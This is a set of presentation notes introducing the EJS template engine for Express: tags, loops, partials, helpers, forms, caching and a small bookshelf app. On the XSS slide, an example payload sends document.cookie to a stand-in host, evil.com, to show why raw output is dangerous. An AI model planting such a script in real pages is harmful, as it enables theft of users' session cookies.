# Introduction to EJS — Presentation Notes

---

## Slide 01 — Title

**Introduction to EJS**

Embedded JavaScript — The Template Engine That's Just JavaScript

19 slides · tags, control flow, partials, security, performance · 2026

---

## Slide 02 — Agenda

### Foundations
- What Is EJS?
- The Complete Tag Set
- Escaped vs Unescaped Output
- Control Flow — Conditionals
- Control Flow — Loops

### Data & Structure
- Passing Data to Templates
- Layouts & Boilerplate
- Partials & Includes
- Custom Filters & Helpers

### Practical Patterns
- Forms & User Input
- Security — XSS Prevention
- Error Handling & Debugging
- Performance & Caching

### Production
- EJS vs Other Engines
- Real-World Project Structure
- Complete Working Example
- Summary & Next Steps

---

## Slide 03 — What Is EJS?

### Philosophy: "Just JavaScript"

EJS stands for **Embedded JavaScript**. Created by TJ Holowaychuk in 2010 as part of the Express.js ecosystem. Unlike Pug or Handlebars, EJS uses plain HTML with embedded JS — no new syntax to learn.

### Key Characteristics

- **Zero learning curve** — if you know JS and HTML, you know EJS
- **No transpilation** — templates compile to plain JS functions
- **Full JS power** — any valid JS expression works inside tags
- **~4.7M weekly npm downloads** — most popular Node template engine
- **Works anywhere** — server-side, CLI tools, static site generators

### Install & Basic Use

```bash
npm install ejs
```

```javascript
const ejs = require('ejs');

// Render a string template
const html = ejs.render(
  '<h1><%= title %></h1>',
  { title: 'Hello EJS' }
);

// Render a file
ejs.renderFile(
  './views/index.ejs',
  { users: [...] },
  (err, html) => {
    res.send(html);
  }
);
```

### File Extension

Convention: `.ejs` files. They're just HTML with embedded JS delimiters.

---

## Slide 04 — EJS Tags — The Complete Set

| Tag | Name | Purpose | Example |
|-----|------|---------|---------|
| `<%= %>` | Escaped Output | Outputs value with HTML entity escaping | `<%= user.name %>` |
| `<%- %>` | Unescaped Output | Outputs raw HTML — no escaping | `<%- include('header') %>` |
| `<% %>` | Scriptlet | Executes JS — no output | `<% if (user) { %>` |
| `<%# %>` | Comment | Ignored entirely — not in output | `<%# TODO: fix layout %>` |
| `<%_ %>` | Whitespace Slurp (leading) | Strips all leading whitespace | `<%_ } %>` |
| `<% _%>` | Whitespace Slurp (trailing) | Strips trailing newline | `<% items.forEach(i => { _%>` |
| `<%- _%>` | Combo: raw + trim | Unescaped output with whitespace trim | `<%- include('nav') _%>` |

**Golden Rule:** Use `<%= %>` by default. Only reach for `<%- %>` when you specifically need raw HTML (includes, pre-sanitised content).

---

## Slide 05 — Output Tags — Escaped vs Unescaped

### `<%= %>` — Escaped (Safe)

```html
<!-- Template -->
<p><%= userInput %></p>

<!-- Data: { userInput: '<script>alert("xss")</script>' } -->

<!-- Output -->
<p>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</p>
```

Characters escaped: `&` `<` `>` `"` `'`

### What Gets Escaped

```javascript
// EJS internal escape function
function escape(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

### `<%- %>` — Unescaped (Dangerous)

```html
<!-- Template -->
<div><%- richContent %></div>

<!-- Data: { richContent: '<strong>Bold</strong>' } -->

<!-- Output -->
<div><strong>Bold</strong></div>
```

HTML renders as-is. **Dangerous with user input!**

### When To Use Unescaped

- Including partials: `<%- include('nav') %>`
- Pre-sanitised CMS content (DOMPurify, sanitize-html)
- Markdown-to-HTML output you control
- **Never** with raw user input

---

## Slide 06 — Control Flow — Conditionals

### if / else if / else

```html
<% if (user.role === 'admin') { %>
  <div class="badge admin">Admin</div>
<% } else if (user.role === 'editor') { %>
  <div class="badge editor">Editor</div>
<% } else { %>
  <div class="badge member">Member</div>
<% } %>
```

### Ternary in Output Tags

```html
<span class="<%= active ? 'on' : 'off' %>">
  <%= active ? 'Active' : 'Inactive' %>
</span>

<!-- Null-safe with optional chaining -->
<p><%= user?.address?.city ?? 'N/A' %></p>
```

### Conditional Rendering Patterns

```html
<!-- Show/hide blocks -->
<% if (errors && errors.length) { %>
  <div class="alert alert-danger">
    <ul>
      <% errors.forEach(e => { %>
        <li><%= e.msg %></li>
      <% }) %>
    </ul>
  </div>
<% } %>

<!-- Conditional attributes -->
<input type="text"
  value="<%= form.name || '' %>"
  <%= form.disabled ? 'disabled' : '' %>
/>

<!-- Conditional CSS classes -->
<tr class="<%= i % 2 === 0 ? 'row-even' : 'row-odd' %>">
```

**Tip: Keep Logic Thin** — Move complex conditions into helper functions or compute them in the route handler. Templates should branch, not compute.

---

## Slide 07 — Control Flow — Loops

### forEach (Most Common)

```html
<ul>
  <% users.forEach(user => { %>
    <li>
      <%= user.name %>
      — <%= user.email %>
    </li>
  <% }) %>
</ul>
```

### for...of Loop

```html
<% for (const item of cart.items) { %>
  <div class="cart-item">
    <span><%= item.name %></span>
    <span>$<%= item.price.toFixed(2) %></span>
  </div>
<% } %>
```

### Classic for Loop (Index Access)

```html
<% for (let i = 0; i < items.length; i++) { %>
  <tr class="<%= i % 2 === 0 ? 'even' : 'odd' %>">
    <td><%= i + 1 %></td>
    <td><%= items[i].name %></td>
  </tr>
<% } %>
```

### Iterating Objects

```html
<!-- Object.entries -->
<dl>
  <% Object.entries(config).forEach(([key, val]) => { %>
    <dt><%= key %></dt>
    <dd><%= val %></dd>
  <% }) %>
</dl>

<!-- for...in -->
<% for (const key in settings) { %>
  <p><%= key %>: <%= settings[key] %></p>
<% } %>
```

### Empty State Pattern

```html
<% if (products.length === 0) { %>
  <p class="empty">No products found.</p>
<% } else { %>
  <% products.forEach(p => { %>
    <div class="product">
      <%= p.name %>
    </div>
  <% }) %>
<% } %>
```

---

## Slide 08 — Passing Data to Templates

### Express res.render()

```javascript
// Route handler
app.get('/dashboard', async (req, res) => {
  const user = await User.findById(req.user.id);
  const stats = await getStats(user.id);

  res.render('dashboard', {
    title: 'Dashboard',
    user,
    stats,
    isAdmin: user.role === 'admin',
    formatDate: (d) => d.toLocaleDateString('en-GB')
  });
});
```

### The locals Object

```javascript
// res.locals — per-request data
app.use((req, res, next) => {
  res.locals.currentUser = req.user;
  res.locals.flash = req.flash();
  next();
});

// Available in ALL templates for this request
// — no need to pass explicitly in res.render()
```

### app.locals — Global Data

```javascript
// Set once at startup
app.locals.siteName = 'My App';
app.locals.version = '2.1.0';
app.locals.nav = [
  { href: '/', label: 'Home' },
  { href: '/about', label: 'About' },
  { href: '/contact', label: 'Contact' },
];

// Accessible in every template:
// <%= siteName %>  <%= version %>
```

### Data Merge Order

EJS merges data in this priority (highest wins):

1. `res.render()` data object
2. `res.locals`
3. `app.locals`

This means route-specific data overrides middleware-set data, which overrides global data.

---

## Slide 09 — Layouts & Boilerplate

### Manual Layout with Includes

```html
<!-- views/pages/home.ejs -->
<%- include('../partials/head', { title: 'Home' }) %>
<%- include('../partials/nav') %>

<main class="container">
  <h1>Welcome, <%= user.name %></h1>
  <p><%= tagline %></p>
</main>

<%- include('../partials/footer') %>
```

Simple but repetitive — every page repeats the include boilerplate.

### express-ejs-layouts

```javascript
// app.js
const ejsLayouts = require('express-ejs-layouts');
app.use(ejsLayouts);
app.set('layout', 'layouts/main');
```

```html
<!-- views/layouts/main.ejs -->
<!DOCTYPE html>
<html>
<head><title><%= title %></title></head>
<body>
  <%- include('../partials/nav') %>
  <%- body %>
  <%- include('../partials/footer') %>
</body>
</html>
```

```html
<!-- views/home.ejs (just the content) -->
<h1>Welcome</h1>
<p>Page content goes here.</p>
```

### ejs-mate (Alternative)

Uses `layout('name')` function inside templates. Popular with older Express apps. Same concept, different API.

---

## Slide 10 — Partials & Includes

### Basic include Syntax

```html
<!-- No data passed -->
<%- include('partials/nav') %>

<!-- Pass data to partial -->
<%- include('partials/card', {
  title: product.name,
  price: product.price,
  image: product.imageUrl
}) %>
```

**Important:** Use `<%- %>` (unescaped) for includes. Using `<%= %>` would escape the HTML output of the partial.

### Reusable Card Partial

```html
<!-- views/partials/card.ejs -->
<div class="card">
  <% if (image) { %>
    <img src="<%= image %>" alt="<%= title %>">
  <% } %>
  <h3><%= title %></h3>
  <p class="price">$<%= price.toFixed(2) %></p>
</div>
```

### Loop + Include Pattern

```html
<!-- Product listing page -->
<div class="grid">
  <% products.forEach(p => { %>
    <%- include('partials/card', {
      title: p.name,
      price: p.price,
      image: p.img
    }) %>
  <% }) %>
</div>
```

### Nested Includes

layout includes nav, nav includes user-menu, user-menu includes avatar. Each partial is independent and testable.

### Path Resolution

Paths are relative to the including template, or absolute from the views root if starting with `/`. Set `app.set('views', path.join(__dirname, 'views'))`.

---

## Slide 11 — Custom Filters & Helpers

### Passing Helper Functions

```javascript
// helpers/format.js
module.exports = {
  currency: (n, curr = 'GBP') =>
    new Intl.NumberFormat('en-GB', {
      style: 'currency', currency: curr
    }).format(n),

  dateShort: (d) =>
    new Date(d).toLocaleDateString('en-GB', {
      day: 'numeric', month: 'short', year: 'numeric'
    }),

  truncate: (str, len = 100) =>
    str.length > len ? str.slice(0, len) + '...' : str,

  pluralise: (count, word) =>
    `${count} ${word}${count !== 1 ? 's' : ''}`
};
```

### Register Globally via app.locals

```javascript
// app.js
const fmt = require('./helpers/format');
Object.assign(app.locals, fmt);

// Now in ANY template:
// <%= currency(product.price) %>
// <%= dateShort(post.createdAt) %>
// <%= truncate(post.body, 200) %>
```

### Using in Templates

```html
<table>
  <% orders.forEach(o => { %>
    <tr>
      <td><%= o.id %></td>
      <td><%= dateShort(o.date) %></td>
      <td><%= currency(o.total) %></td>
      <td><%= pluralise(o.items, 'item') %></td>
    </tr>
  <% }) %>
</table>
```

**Tip:** Keep helpers as pure functions — no side effects, no DB calls. They format and transform, nothing more.

---

## Slide 12 — Forms & User Input

### Rendering a Form

```html
<form action="/register" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">

  <label for="name">Name</label>
  <input type="text" id="name" name="name"
    value="<%= form.name || '' %>"
    class="<%= errors?.name ? 'is-invalid' : '' %>">
  <% if (errors?.name) { %>
    <span class="error"><%= errors.name.msg %></span>
  <% } %>

  <label for="email">Email</label>
  <input type="email" id="email" name="email"
    value="<%= form.email || '' %>">

  <button type="submit">Register</button>
</form>
```

### Route: Repopulate on Error

```javascript
app.post('/register',
  body('name').notEmpty().trim(),
  body('email').isEmail(),
  (req, res) => {
    const errs = validationResult(req);
    if (!errs.isEmpty()) {
      return res.render('register', {
        title: 'Register',
        form: req.body,        // repopulate
        errors: errs.mapped(), // field errors
        csrfToken: req.csrfToken()
      });
    }
    // ... create user
  }
);
```

### Select & Checkbox Patterns

```html
<select name="role">
  <% ['user','editor','admin'].forEach(r => { %>
    <option value="<%= r %>"
      <%= form.role === r ? 'selected' : '' %>>
      <%= r %>
    </option>
  <% }) %>
</select>
```

### CSRF Protection

Always include a CSRF token in forms. Use `csurf` or the built-in `csrf-csrf` middleware. The hidden input ensures POST requests are legitimate.

---

## Slide 13 — Security — XSS Prevention

### The Danger: Cross-Site Scripting

```html
<!-- VULNERABLE: unescaped user input -->
<div><%- userComment %></div>

<!-- If userComment contains: -->
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

<!-- SAFE: escaped output -->
<div><%= userComment %></div>
```

### Rule of Thumb

| Scenario | Tag |
|----------|-----|
| User-supplied text | `<%= %>` always |
| Including partials | `<%- %>` (required) |
| CMS / Markdown HTML | `<%- %>` after sanitising |
| JSON in script tag | `JSON.stringify()` |

### Sanitisation for Rich Content

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// In route handler
const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b','i','p','a','ul','li'],
  ALLOWED_ATTR: ['href']
});
res.render('post', { content: clean });
```

```html
<!-- Template — safe after sanitisation -->
<article><%- content %></article>
```

### Embedding Data in JS Safely

```html
<script>
  // SAFE — JSON.stringify escapes angle brackets in strings
  const data = <%- JSON.stringify(data) %>;
</script>
```

Avoids string interpolation XSS in inline scripts.

---

## Slide 14 — Error Handling & Debugging

### Common Template Errors

| Error | Cause |
|-------|-------|
| `x is not defined` | Variable not passed to `res.render()` |
| `Cannot read property of undefined` | Accessing nested property on null |
| `Could not find include` | Wrong path in `include()` |
| `Unexpected token` | Syntax error in scriptlet JS |
| `SyntaxError: missing )` | Unclosed tag or mismatched braces |

### Defensive Template Coding

```html
<!-- Use defaults to avoid crashes -->
<%= typeof title !== 'undefined' ? title : 'Default Title' %>

<!-- Optional chaining -->
<%= user?.profile?.avatar ?? '/img/default.png' %>

<!-- locals object (Express) -->
<%= locals.title || 'Fallback' %>
```

### Express Error Page

```javascript
// Error-handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500);
  res.render('error', {
    message: err.message,
    stack: app.get('env') === 'development' ? err.stack : ''
  });
});
```

```html
<!-- views/error.ejs -->
<h1><%= message %></h1>
<% if (stack) { %>
  <pre><%= stack %></pre>
<% } %>
```

### Debugging Tips

- Set `DEBUG=ejs:* node app.js` for verbose logging
- Check `err.message` — EJS reports line numbers
- Use `<%# %>` comments to isolate sections
- Temporarily add `<pre><%= JSON.stringify(locals, null, 2) %></pre>` to dump all data

---

## Slide 15 — Performance & Caching

### How EJS Compiles Templates

`.ejs file` → (parse) → `JS function` → (compile, cached) → `HTML string` → (execute)

Parsing is the expensive step. Once compiled, the JS function is reused. The `cache` option stores compiled functions in memory.

### Express View Cache

```javascript
// Auto-enabled in production
app.set('view cache', true);

// Or via NODE_ENV
// NODE_ENV=production node app.js
// Express enables view cache automatically when NODE_ENV === 'production'
```

In dev, templates are re-read and re-compiled on every request (useful for live editing). In production, they compile once.

### EJS cache Option

```javascript
// Standalone EJS usage
ejs.renderFile('tpl.ejs', data, {
  cache: true,       // enable caching
  filename: 'tpl'    // cache key
});

// Precompile for distribution
const fn = ejs.compile(templateString, { client: true }); // browser-safe
// fn(data) => HTML string
```

### Performance Tips

- **Always** enable view cache in production
- Keep partials small — each include is a function call
- Avoid deeply nested includes (3+ levels)
- Move heavy computation to route handlers, not templates
- Consider precompiling templates at build time for serverless
- Use `<%_ _%>` whitespace trimming to reduce HTML size

### Benchmarks (Approximate)

| Engine | Renders/sec |
|--------|-------------|
| EJS (cached) | ~28,000 |
| Pug (cached) | ~22,000 |
| Handlebars (precompiled) | ~35,000 |
| Nunjucks (cached) | ~18,000 |

---

## Slide 16 — EJS vs Other Template Engines

| Feature | EJS | Pug | Handlebars | Nunjucks |
|---------|-----|-----|------------|----------|
| Syntax | HTML + JS tags | Indentation-based | Mustache `{{ }}` | Jinja2-style `{% %}` |
| Learning Curve | **Minimal** | Moderate | Low | Low-Moderate |
| JS in Templates | Full JS access | Full JS access | **No** (logic-less) | Limited expressions |
| Layouts | Via plugin/includes | **Built-in** extends | Via partials | **Built-in** extends |
| Auto-Escape | `<%= %>` escapes | Default escaped | Default escaped | Default escaped |
| npm Weekly DLs | **~4.7M** | ~1.5M | ~3.2M | ~0.9M |
| IDE Support | HTML + JS tooling | Needs extension | Needs extension | Needs extension |
| Best For | JS devs, rapid dev | Clean markup fans | Logic separation | Python devs, i18n |

**When to choose EJS:** You want plain HTML, full JavaScript power, zero new syntax, and the largest community. **When not to choose EJS:** You need built-in template inheritance, logic-less enforcement, or async iteration.

---

## Slide 17 — Real-World Express + EJS Project Structure

### Directory Layout

```
my-app/
├── app.js
├── package.json
├── .env
├── config/
│   └── db.js
├── routes/
│   ├── index.js
│   ├── auth.js
│   └── products.js
├── controllers/
│   ├── authController.js
│   └── productController.js
├── models/
│   ├── User.js
│   └── Product.js
├── middleware/
│   ├── auth.js
│   └── validate.js
├── helpers/
│   └── format.js
├── views/
│   ├── layouts/
│   │   └── main.ejs
│   ├── partials/
│   │   ├── head.ejs
│   │   ├── nav.ejs
│   │   ├── flash.ejs
│   │   └── footer.ejs
│   ├── pages/
│   │   ├── home.ejs
│   │   ├── about.ejs
│   │   └── contact.ejs
│   ├── auth/
│   │   ├── login.ejs
│   │   └── register.ejs
│   ├── products/
│   │   ├── index.ejs
│   │   ├── show.ejs
│   │   └── edit.ejs
│   └── error.ejs
└── public/
    ├── css/
    │   └── style.css
    ├── js/
    │   └── main.js
    └── images/
```

### Key Principles

- **views/layouts/** — HTML shell with `<%- body %>`
- **views/partials/** — reusable fragments (nav, footer, flash)
- **views/pages/** — static-ish content pages
- **views/{resource}/** — CRUD views per model
- **helpers/** — pure formatting functions
- **public/** — static assets served by Express

### app.js Setup

```javascript
const express = require('express');
const ejsLayouts = require('express-ejs-layouts');
const path = require('path');
const fmt = require('./helpers/format');

const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(ejsLayouts);
app.set('layout', 'layouts/main');

// Make helpers available globally
Object.assign(app.locals, fmt);
app.locals.siteName = 'My App';

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
```

### Naming Conventions

Use `index.ejs` for list views, `show.ejs` for detail, `edit.ejs` / `new.ejs` for forms. Mirrors Rails/Express conventions.

---

## Slide 18 — Complete Working Example

### app.js — Full Express + EJS App

```javascript
const express = require('express');
const ejsLayouts = require('express-ejs-layouts');
const path = require('path');
const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(ejsLayouts);
app.set('layout', 'layouts/main');
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.locals.siteName = 'BookShelf';
app.locals.year = new Date().getFullYear();

let books = [
  { id: 1, title: '1984', author: 'Orwell', year: 1949 },
  { id: 2, title: 'Dune', author: 'Herbert', year: 1965 },
];
let nextId = 3;

app.get('/', (req, res) => {
  res.render('pages/home', { title: 'Home', books });
});

app.get('/books/new', (req, res) => {
  res.render('books/new', {
    title: 'Add Book', form: {}, errors: null
  });
});

app.post('/books', (req, res) => {
  const { title, author, year } = req.body;
  if (!title || !author) {
    return res.render('books/new', {
      title: 'Add Book',
      form: req.body,
      errors: { msg: 'All fields required' }
    });
  }
  books.push({ id: nextId++, title, author, year: parseInt(year) });
  res.redirect('/');
});

app.listen(3000);
```

### views/layouts/main.ejs

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><%= title %> | <%= siteName %></title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <%- include('../partials/nav') %>
  <main class="container">
    <%- body %>
  </main>
  <footer>&copy; <%= year %> <%= siteName %></footer>
</body>
</html>
```

### views/pages/home.ejs

```html
<h1>All Books</h1>
<a href="/books/new">+ Add Book</a>
<% if (books.length === 0) { %>
  <p>No books yet.</p>
<% } else { %>
  <table>
    <tr><th>Title</th><th>Author</th><th>Year</th></tr>
    <% books.forEach(b => { %>
      <tr>
        <td><%= b.title %></td>
        <td><%= b.author %></td>
        <td><%= b.year %></td>
      </tr>
    <% }) %>
  </table>
<% } %>
```

### views/books/new.ejs

```html
<h1>Add a Book</h1>
<% if (errors) { %>
  <p class="error"><%= errors.msg %></p>
<% } %>
<form method="POST" action="/books">
  <input name="title" placeholder="Title"
    value="<%= form.title || '' %>">
  <input name="author" placeholder="Author"
    value="<%= form.author || '' %>">
  <input name="year" placeholder="Year"
    value="<%= form.year || '' %>">
  <button type="submit">Save</button>
</form>
```

---

## Slide 19 — Summary & Next Steps

### Core Takeaways

- EJS = plain HTML + embedded JavaScript
- `<%= %>` for escaped, `<%- %>` for raw, `<% %>` for logic
- Full JS power — any expression, any loop, any conditional
- Includes for partials, plugins for layouts
- Auto-escaping prevents XSS by default

### Best Practices

- Always use `<%= %>` for user data
- Keep templates thin — compute in handlers
- Extract reusable markup into partials
- Register helpers on `app.locals`
- Enable view cache in production
- Use `locals.x` for optional variables

### Next Steps

- Build a CRUD app with Express + EJS
- Add authentication (Passport.js + EJS forms)
- Explore `express-ejs-layouts` for DRY layouts
- Integrate flash messages (`connect-flash`)
- Add client-side validation alongside server-side
- Try HTMX + EJS for dynamic partial updates

### Essential Resources

- **Official Docs:** ejs.co
- **GitHub:** github.com/mde/ejs
- **npm:** npmjs.com/package/ejs
- **Express Guide:** expressjs.com/en/guide/using-template-engines.html

### Key Packages

| Package | Purpose |
|---------|---------|
| `ejs` | Template engine |
| `express-ejs-layouts` | Layout support |
| `ejs-mate` | Alternative layouts |
| `dompurify` + `jsdom` | HTML sanitisation |
| `express-validator` | Form validation |
